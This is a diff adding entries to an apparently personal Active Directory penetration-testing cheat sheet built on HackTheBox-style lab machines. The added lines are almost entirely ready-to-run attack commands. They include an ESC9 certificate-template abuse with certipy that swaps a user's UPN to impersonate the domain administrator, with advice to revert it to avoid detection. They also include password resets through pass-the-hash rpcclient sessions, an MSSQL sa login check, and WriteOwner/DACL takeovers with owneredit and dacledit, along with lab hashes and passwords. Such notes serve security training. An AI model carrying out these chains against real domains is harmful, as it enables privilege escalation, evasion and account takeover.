@@ -1247,6 +1247,26 @@ impacket-secretsdump tri.lab/j.reed_adm@RUN-SRV.tri.lab -hashes :NTHASH -just-dc
 
 ```
 
+```bash
+# ESC9 : this will require us to have generic write over the ca_operator or someone of the CA management group and it will require a specific permission on the DC . 
+
+==> the idea is simple we change with our generic write the UPN of the ca_operator to the one of an administrator and then we request the cert for the ca_operator, this will trick the CA into embedding the administrator's UPN in the cert.
+
+==> ESC9 works because the template has CT_FLAG_NO_SECURITY_EXTENSION set (no szOID_NTDS_CA_SECURITY_EXT), so the cert has no SID binding to fall back on the KDC will map the cert purely by UPN. After requesting we revert the UPN back to normal (so we don't break ca_operator's real login / to avoid detection), and then authenticate with the cert as administrator via Kerberos PKINIT.
+ 
+certipy account -u 'management_svc@certified.htb' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -dc-ip $target -user 'ca_operator' read
+
+certipy-ad account -u 'management_svc@certified.htb' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -dc-ip $target -upn 'administrator@certified.htb' -user 'ca_operator' update
+
+certipy-ad req -u 'ca_operator@certified.htb' -p 'Password123!' -dc-ip $target -target 'DC01.certified.htb' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
+    
+certipy-ad account -u 'management_svc@certified.htb' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -dc-ip $target -upn 'ca_operator@certified.htb' -user 'ca_operator' update
+    
+certipy-ad auth -dc-ip $target -pfx 'administrator.pfx' -username 'administrator' -domain 'certified.htb'
+
+```
+
+
 ### PowerShell Passwords Extraction :
 
 ```powershell
@@ -1270,7 +1290,10 @@ smbpasswd -r $IP -U sbradley
 **Interact with MSSQL :** 
 
 ```bash
-impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.59.194 -windows-auth : Login 
+impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.59.194 -windows-auth : Login
+
+==> Always check the sa user of the MSSQL DB :
+nxc mssql -u sa-p Password --local-auth 
 ```
 
 ```bash
@@ -1870,6 +1893,17 @@ python3 wmiexec2.py anomaly.hsm/anna_molly@$target -hashes ':be4bf3131851aee9a42
 net rpc password "ROBERT.GRAEF" "Password.123" -U "404FINANCE.LOCAL"/"tom.reboot"%"P@ssw0rd123" -S "DC-404.404finance.local" 
 bloodyad --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' set password 'MELANIE.KUNZ' 'WEAK123.' 
 
+# Change Password via rpc client using a hash only :
+rpcclient -U "certified.htb/management_svc%a091c1832bcdd4677c28b5a6a1295584" --pw-nt-hash $target
+rpcclient $> setuserinfo2 ca_operator 23 'Password123!'
+rpcclient $> exit
+
+
+# Change Password via PS or Winrm (needs PowerView) :
+$pass = ConvertTo-SecureString 'Pass.123' -AsPlainText -Force
+set-domainuserpassword -identity ca_svc -accountpassword $pass
+runas /user:[domain\user] cmd.exe
+
 # Add Group Member :
 bloodyad  --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' add groupMember 'REMOTE DESKTOP USERS' 'MELANIE.KUNZ'
 
@@ -1898,6 +1932,20 @@ python3 targetedKerberoast.py -v -d 'city.local' -u 'jon.peters' -p '1234heresjo
 ==> Shadow Credential Attack:
 certipy-ad shadow auto -u usernamewhohasGenericWrite@Domain -p Password -account VictimAccount .
 certipy-ad shadow auto -u usernamewhohasGenericWrite@Domain -H :NTLMHash -account VictimAccount . : This will give us the Hash of the VictimAccount . 
+
+
+# Write Owner :
+
+==> Over a Group :
+owneredit.py -action write -new-owner 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09' -dc-ip $target
+dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09' -dc-ip $target
+net rpc group addmem "Management" judith.mader -U certified.htb/judith.mader%'judith09' -S $target
+
+==> Over a user :
+owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
+
+==> Then just grant ourselves generic all (owner alone doesn't give control) :
+dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
 
 # Write DACL Over an entire OU : Grant ourselves Generic ALL :
 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'emma.hayes' -target-dn 'OU=CITYOPS,DC=CITY,DC=LOCAL' 'city.local'/'emma.hayes':'!Gemma4James!'
